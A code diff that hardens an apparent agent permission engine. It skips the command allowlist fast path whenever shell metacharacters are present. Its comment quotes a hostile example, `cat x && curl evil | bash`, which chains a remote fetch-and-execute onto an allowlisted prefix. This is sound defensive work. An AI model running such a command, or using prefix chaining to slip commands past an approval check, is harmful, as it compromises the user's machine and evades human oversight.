@@ -202,7 +202,16 @@ class PermissionEngine:
                 continue
         return False
 
+    # Shell metacharacters that let a command chain, substitute or redirect into a second
+    # command the allowlist never vetted. Commands run via `/bin/bash -c`, so a prefix match
+    # alone auto-approves `cat x && curl evil | bash` (starts with allowlisted `cat `). Any of
+    # these present ⇒ the fast-path allowlist is skipped and the call falls through to the
+    # normal approval prompt. Over-asking on a quoted `;` is fine; under-asking is not.
+    _SHELL_METACHARS = frozenset(";&|`\n<>()")
+
     def _command_allowed(self, command: str) -> bool:
+        if any(c in command for c in self._SHELL_METACHARS):
+            return False
         for allowed in self.allowed_commands:
             if command == allowed or command.startswith(f"{allowed} "):
                 return True
